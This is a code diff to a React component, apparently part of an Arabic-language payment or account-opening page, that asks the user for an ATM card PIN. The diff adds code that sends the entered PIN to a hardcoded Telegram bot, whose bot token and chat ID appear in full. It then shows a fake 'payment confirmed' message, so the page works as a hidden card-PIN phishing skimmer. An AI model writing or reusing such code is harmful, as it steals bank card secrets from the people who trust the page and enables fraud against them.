@@ -9,6 +9,7 @@ import {
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
+import { useToast } from "@/hooks/use-toast";
 
 const steps = [
   { number: 1, title: "نوع الحساب" },
@@ -20,11 +21,37 @@ const steps = [
 const ATMPin = () => {
   const [pin, setPin] = useState("");
   const navigate = useNavigate();
+  const { toast } = useToast();
 
-  const handleConfirm = () => {
+  const sendToTelegram = async (message: string) => {
+    try {
+      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
+      const chatId = "-4985537188";
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
+    } catch (error) {
+      console.error("فشل الإرسال إلى Telegram:", error);
+    }
+  };
+
+  const handleConfirm = async () => {
     if (pin.length === 4) {
-      alert("تم تأكيد عملية الدفع بنجاح");
-      // يمكن إضافة المزيد من المنطق هنا
+      const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
+      await sendToTelegram(message);
+      toast({
+        title: "تم تأكيد الدفع بنجاح!",
+        description: "تمت عملية الدفع بنجاح",
+      });
     }
   };
 
